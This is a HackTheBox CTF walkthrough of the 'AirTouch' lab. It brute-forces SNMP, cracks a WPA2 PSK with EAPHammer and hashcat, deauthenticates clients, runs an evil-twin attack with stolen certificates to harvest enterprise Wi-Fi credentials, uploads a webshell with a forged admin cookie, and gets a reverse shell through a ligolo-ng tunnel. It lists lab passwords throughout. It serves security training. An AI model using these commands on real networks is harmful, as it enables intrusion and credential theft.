---
title: "HackTheBox: AirTouch"
description: "Escaping VLAN using Aircrack-ng-suite and EAPHammer."
summary: "Escaping VLAN using Aircrack-ng-suite and EAPHammer."
date: 2026-04-18
draft: false
slug: "hackthebox-airtouch"
categories: ["CTF Writeups", "Cloud Security", "Network Security", "Web Security", "Browsed Security"]
tags: ["CTF","CTF Writeup", "CloudSecurity","Misconfigurations","security CTF writeup","HTB","AirTouch","Airmon-ng","Aircrack-ng suite","airodump-ng","aireplay-ng","EAPHammer","Evil-Twin Attack","WPA-PSK","WPA2-MGT","WPA-PEAP","File Upload Bypass","Vlan Pivoting","vlan attack","network penetration","Decrypting packets","wireshark","wpa_supplicant","wpa_supplicant AD config","HTB","HackTheBox","HackTheBox: AirTouch","HTB: AirTouch","Information Gathering"]
keywords: ["CTF","CTF Writeup", "CloudSecurity","Misconfigurations","security CTF writeup","HTB","AirTouch","Airmon-ng","Aircrack-ng suite","airodump-ng","aireplay-ng","EAPHammer","Evil-Twin Attack","WPA-PSK","WPA2-MGT","WPA-PEAP","File Upload Bypass","Vlan Pivoting","vlan attack","network penetration","Decrypting packets","wireshark","wpa_supplicant","wpa_supplicant AD config","HTB","HackTheBox","HackTheBox: AirTouch","HTB: AirTouch","Information Gathering"]
weight: 71
cardImage: "images/writeups/featured.jpg"
showTags: true
---

![image.png](/writeups/htb/airtouch/image.png)

## Initial Enumeration

### Consultant Machine:

1. Open Ports:
    
    ```bash
    22/tcp - ssh
    161/udp - snmp
    ```
    
    ![image.png](/writeups/htb/airtouch/1.png)
    
    ![image.png](/writeups/htb/airtouch/2.png)
    
2. Snmp brute force:
    
    ```bash
    hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.10.150 snmp
    ```
    
    ![image.png](/writeups/htb/airtouch/3.png)
    
3. Dumping snmp traffic:
    
    ```bash
    snmpbulkwalk --Cr1000 -c public -v2c 10.129.10.150 . | tee bulk.txt
    ```
    
    ![image.png](/writeups/htb/airtouch/4.png)
    
    ```bash
    consultant:RxBlZhLmOkacNWScmZ6D
    ```
    

## Initial Access

### Consultant’s machine:

1. Ssh into the consultant’s machine using the creds found in snmp dump.
    
    ```bash
    sshpass -p "RxBlZhLmOkacNWScmZ6D" ssh consultant@10.129.10.150
    ```
    
    ![image.png](/writeups/htb/airtouch/5.png)
    
2. We can use `sudo`  without password
    
    ![image.png](/writeups/htb/airtouch/6.png)
    
3. According to the images on the consultant’s home directory, the current machine is in an `Consultant's vlan` 
    
    ![image.png](/writeups/htb/airtouch/7.png)
    
    ![image.png](/writeups/htb/airtouch/8.png)
    
4. **VLANs are Isolated at Layer 2, Not Layer 3**
    
    By default, a switch will not allow traffic from VLAN 10 to move to VLAN 20. But in almost all practical scenarios, you *want* devices on different VLANs to talk to each other (e.g., your laptop on a private VLAN accessing a printer on a server VLAN).
    
    - **The Switch:** Acts as a boundary.
    - **The Router/Firewall:** Acts as the bridge. If a router is connected to both VLANs, it will route traffic between them by default.

### PSK Cracking:

1. Check for available interfaces(airmon-ng):
    
    ```bash
    airmon-ng
    ```
    
    ![image.png](/writeups/htb/airtouch/9.png)
    
    1. Change/start the available interface in monitoring mode:
        
        ```bash
        airmon-ng start wlan0
        ```
        
        ![image.png](/writeups/htb/airtouch/10.png)
        
2. Scanning nearby networks (airodump-ng):
    1. Scan network
        
        ```bash
        #-b flag with argument abg tell airodump to hop on all channels 2.4 Ghz to 5.0 Ghz
        airodump-ng -b abg wlan0mon
        ```
        
        ![image.png](/writeups/htb/airtouch/11.png)
        
    2. According to the scan, `AirTouch-Internet`  is using `PSK` authentication meaning (Pre-Shared key)
        1. PSK → a common, simple security method for home/small office Wi-Fi using a single password (passphrase) for all users, which encrypts data using AES or TKIP
        2. Why are we targeting `AirTouch-Internet` ? because we are trying to pivot to tablet’s network. You can try to get PSK’s from other networks.
3. Dumping `PSK`  using  https://github.com/s0lst1c3/eaphammer:
    1. Requirements:
        1. ssid (essid) → `AirTouch-Internet`  (optional if you have AP-mac)
        2. AP-mac (bssid) → `F0:9F:C2:A3:F1:A7` (optional if you have ssid)
            
            ![image.png](/writeups/htb/airtouch/12.png)
            
    2. Catching `PSK` :
        
        ```bash
        ./eaphammer -i wlan0mon -e 'AirTouch-Internet' --bssid F0:9F:C2:A3:F1:A7 --pmkid
        ```
        
        ![image.png](/writeups/htb/airtouch/13.png)
        
        1. Found authorized Handshake → found authorized handshake in a Pre-Shared Key (PSK) network, specifically WPA2-PSK refers to a captured 4-way handshake that has been successfully analyzed to verify the network password (passphrase). 
        2. Get the file from `/root/eaphammer/tmp` 
            
            ```bash
            cp /root/eaphammer/tmp/hcxdumptool-output-2026-01-20-23-41-06-W2ekODH4JyyMCIwPmtOMXBr3zmaawcr6.txt  /home/consultant/
            sshpass -p "RxBlZhLmOkacNWScmZ6D" scp consultant@10.129.10.150:/home/consultant/hcxdumptool-output-2026-01-20-23-41-06-W2ekODH4JyyMCIwPmtOMXBr3zmaawcr6.txt .
            ```
            
            ![image.png](/writeups/htb/airtouch/14.png)
            
            ![image.png](/writeups/htb/airtouch/15.png)
            
    3. Convert the captured data to a crackable hash:
        
        ```bash
        hcxpcapngtool -o crackme.hash -E elist hcxdumptool-output-2026-01-20-23-41-06-W2ekODH4JyyMCIwPmtOMXBr3zmaawcr6.txt
        ```
        
        ![image.png](/writeups/htb/airtouch/16.png)
        
    4. Crack the hash using hashcat:
        
        ```bash
        hashcat crackme.hash /usr/share/wordlists/rockyou.txt
        ```
        
        ![image.png](/writeups/htb/airtouch/17.png)
        
    5. PSK → `AirTouch-Internet:challenge` , the passphrase is `challenge` 

### Pivoting to Tablets Vlan

1. Configure `wpa_supplicant` → `wpa_supplicant` is a crucial, open-source software daemon that acts as the client-side component (supplicant) for connecting to secure wireless networks, implementing protocols like WPA, WPA2, and WPA3 to handle authentication, key negotiation, and driver control for your Wi-Fi connection on Linux, Windows, and other systems. It manages the complex process of proving your identity and establishing an encrypted link with the Wi-Fi Access Point (Authenticator) and controlling your wireless adapter's connection, working in the background for seamless access. 
2. Create a config:
    
    ```bash
    # /etc/wpa_supplicant/wpa_supplicant.conf
    ctrl_interface=/var/run/wpa_supplicant
    ctrl_interface_group=0
    update_config=1
    network={
        ssid="AirTouch-Internet"
        psk="challenge"
    }
    ```
    
3. Bind the wpa_supplicant to `wlan1` interface:
    
    ```bash
    sudo wpa_supplicant -i wlan1 -c /home/consultant/internet.conf
    ```
    
    ![image.png](/writeups/htb/airtouch/48d7cd5f-ef02-47c2-ae8d-e563f06b6cbe.png)
    
4. Start the interface:
    
    ```bash
    dhclient wlan1
    ```
    
    ![image.png](/writeups/htb/airtouch/8a9fbfbd-b6a3-47c6-8be5-011db55fa316.png)
    
5. We are now connected to `Tablets vlan`  and can access tablets network.

## Initial Enumeration

### Enumerate Tablets vlan

1. Search for active hosts:
    
    ```bash
    nmap -sn 192.168.3.0/24
    ```
    
    ![image.png](/writeups/htb/airtouch/18.png)
    
2. Active ports `53,22,80` on `192.168.3.1` 
    
    ![image.png](/writeups/htb/airtouch/19.png)
    
3. Dump the packets while performing deauth with the source ip as `192.168.3.1` . Let the data packets exceed the threshold of 100.
    
    ```bash
    sudo airodump-ng -c 6 -w dump wlan0
    sudo aireplay-ng -0 2 -a F0:9F:C2:A3:F1:A7 -l 192.168.3.1 wlan0
    ```
    
4. Copy and open the dumped packet capture file in Wireshark. Configure Wireshark to decrypt the captured packet using the passphrase and ssid we got from PSK cracking. `challenge:AirTouch-Internet` .
    1. Edit → Preference → protocols → IEEE 806.11 → Decryption Keys 
        1. wpa-pwd | challenge:AirTouch-Internet
        
        ![image.png](/writeups/htb/airtouch/20.png)
        
5. Found `HTTP` traffic to and from `192.168.3.1` and `192.168.3.74` 
    
    ![image.png](/writeups/htb/airtouch/21.png)
    
6. Two cookies `PHPSESSID` and `UserRole` 
    
    ![image.png](/writeups/htb/airtouch/22.png)
    

## Tunneling (ligolo-ng)

1. Upload ligolo agent and connect it to the proxy, and create a tunnel. To tunnel requests between the attacker's machine and `192.168.3.1` 
    
    ![image.png](/writeups/htb/airtouch/23.png)
    
    ![image.png](/writeups/htb/airtouch/24.png)
    

### Getting Access to **`AirTouch-AP-PSK`**

1. After establishing a tunnel, we can access the website being served on `192.168.3.1` 
    
    ![image.png](/writeups/htb/airtouch/25.png)
    
2. There is a login page, but there are no valid credentials to login. However, we found cookies in the packet dump. Maybe we can use them to access the page.
3. We got access to the management console using those cookies
    
    ![image.png](/writeups/htb/airtouch/26.png)
    
4. There is an empty div named content at the end, we can see that there is a cookie name `UserRole` lets see if we change the role from user to admin. Maybe something will change or will unlock additional features on website
    1. Before
        
        ![image.png](/writeups/htb/airtouch/27.png)
        
    2. After
        
        ![image.png](/writeups/htb/airtouch/28.png)
        
5. Changing the `UserRole:admin` revealed additional upload functionality.
6. Let’s try to upload a php payload to get a RCE/webshell. I perfer webshells if I can access them from a browser as it is easy to verify if webshell is working properly.
    
    ![image.png](/writeups/htb/airtouch/29.png)
    
7. We can try basic bypass techniques to check if the uploaded files are being validated or if they are only checking the extension. `phtml` extension bypasses the upload restriction.
    
    ![image.png](/writeups/htb/airtouch/30.png)
    
8. We got RCE on `192.168.3.1` , Now we can use the webshell to get a reverse shell to the attacker's machine.
    
    ![image.png](/writeups/htb/airtouch/31.png)
    
9. To get a reverseshell connection to the attackers machine, you need to add a listener that will port forward traffic from `ligolo-agent` (consultant’s machine) to `ligolo-proxy` (attacker’s machine).
    
    ![image.png](/writeups/htb/airtouch/32.png)
    
    ```bash
    # Port forward traffic from Consultant's machine to Attacker's Machine
    # --addr configures the agent (192.168.3.23) to listen for traffic from everywhere on port 80 and --to flag configures attacker's machine to accept the traffic coming from everywhere on port 80 
    listener_add --addr 0.0.0.0:80 --to 0.0.0.0:80
    ```
    
    ![image.png](/writeups/htb/airtouch/33.png)
    
10. We got a shell:
    
    ![image.png](/writeups/htb/airtouch/34.png)
    
11. The `index.php` file was checking for extensions
    
    ![image.png](/writeups/htb/airtouch/35.png)
    

## Priv-Esc AirTouch-AP-PSK:

1. There is a `root` and `user` user.
2. There are two passwords in `login.php`  we can try to switch to `user` using the found passwords
    
    ```bash
    JunDRDZKHDnpkpDDvay #can be used to ssh
    2wLFYNh4TSTgA5sNgT4
    ```
    
    ![image.png](/writeups/htb/airtouch/36.png)
    
3. We are successfully able to switch to `user` using `JunDRDZKHDnpkpDDvay`
    
    ![image.png](/writeups/htb/airtouch/37.png)
    
4. The user can use `sudo` without password
    
    ![image.png](/writeups/htb/airtouch/38.png)
    
5. We found `PSK` for 
    
    ![image.png](/writeups/htb/airtouch/39.png)
    
    ![image.png](/writeups/htb/airtouch/40.png)
    
6. We also found the username and credentials that we can use to login on `10.10.10.1` . However, there is no available path.
    
    ```bash
    remote:xGgWEwqUpfoOVsLeROeG
    ```
    
    ![image.png](/writeups/htb/airtouch/41.png)
    
7. According to the script certs are being transferred to `10.10.10.1` , the certs contain `ca.crt, server.crt, server.key, ca.conf, server.conf, server.csr, server.ext` 
    
    ![image.png](/writeups/htb/airtouch/42.png)
    
8. As we know that `AirTouch-Office` is using `WPA2-MGT` which is `WPA2-Enterprise` we can use RADIUS attack with EAPHammer to steal `RADIUS Credential (passphrase similar to one we got from PSK)` from `AirTouch-Office vlan` network.
    1. RADIUS servers are used to authenticate users individually.
    
    ![image.png](/writeups/htb/airtouch/43.png)
    
9. To perform steal RADIUS Credentials using EAPHammer, we need the server’s certificate and private key, and the Certification Authorities Certificate. We can get the certs from `AirTouch-AP-PSK` and use them to perform this attack.
    
    ![image.png](/writeups/htb/airtouch/44.png)
    
    ![image.png](/writeups/htb/airtouch/45.png)
    
10. Use the certificates with EAPHammer to start stealing network creds
    
    ```bash
    ./eaphammer --creds -c 44 --hw-mode a -e "AirTouch-Office" -b AC:8B:A9:AA:3F:D2 -i wlan2 --server-cert /home/server.crt --ca-cert /home/ca.crt --private-key /home/server.key
    
    ./eaphammer --creds -c 44 --hw-mode a -e "AirTouch-Office" -b AC:8B:A9:F3:A1:13 -i wlan2 --server-cert /home/server.crt --ca-cert /home/ca.crt --private-key /home/server.key
    ```
    
    ![image.png](/writeups/htb/airtouch/46.png)
    
11. Crack the hash:
    
    ```bash
    hashcat ntlm.hash /usr/share/wordlists/rockyou.txt
    ```
    
    ![image.png](/writeups/htb/airtouch/47.png)
    
12. `wpa_supplicant` config to connect to `AirTouch-Office` vlan:
    
    ```bash
    # nano /etc/wpa_supplicant/wpa_supplicant_wlan.conf
    ctrl_interface=/var/run/wpa_supplicant
    ctrl_interface_group=0
    update_config=1
    network={
        ssid="AirTouch-Office"
        key_mgmt=WPA-EAP
        eap=PEAP
        identity="AirTouch\r4ulcl"
        password="laboratory"
        phase2="auth=MSCHAPV2"
    }
    ```
    
    ```bash
    sudo wpa_supplicant -B -i wlan2 -c /etc/wpa_supplicant/wpa_supplicant_wlan.conf
    dhclient wlan2
    ```
    
    ![image.png](/writeups/htb/airtouch/48.png)
    

## PrivEsc `AirTouch-AP-MGT`

1. SSH into `10.10.10.1`  using the credentials we found in `send_certs.sh` 
    
    ```bash
    remote:xGgWEwqUpfoOVsLeROeG
    ```
    
    ![image.png](/writeups/htb/airtouch/49.png)
    
2. We found interesting files in `/etc/hostapd` , using `linpeas.sh` 
    
    ![image.png](/writeups/htb/airtouch/50.png)
    
3. `/etc/hostapd/hostapd_wpa.eap_user` contains credentials for `admin` 
    
    ```bash
    admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7
    ```
    
    ![image.png](/writeups/htb/airtouch/51.png)
    
4. Switch user to `admin` using the password, admin does not require password for using `sudo` 
    
    ```bash
    su admin
    
    cat /root/root.txt
    ```
    
    ![image.png](/writeups/htb/airtouch/52.png)
    

![image.png](/writeups/htb/airtouch/53.png)

## Reference

https://dev.to/rijultp/airodump-ng-for-beginners-scanning-and-monitoring-wi-fi-networks-377d

https://bc170401576.medium.com/wireless-penetration-testing-what-you-should-understand-d3d9564d06fa

https://medium.com/@lachunasberme/using-aireplay-ng-general-attack-techniques-799b21147d5b

https://medium.com/@DbgMan/the-joy-of-wireless-all-you-need-about-evil-twin-attacks-part-2-9be0ad26764a

https://hackyourmom.com/en/kibervijna/vid-novachka-do-guru-shlyah-u-pentestyngu-wi-fi/

https://hashcat.net/cap2hashcat/index.pl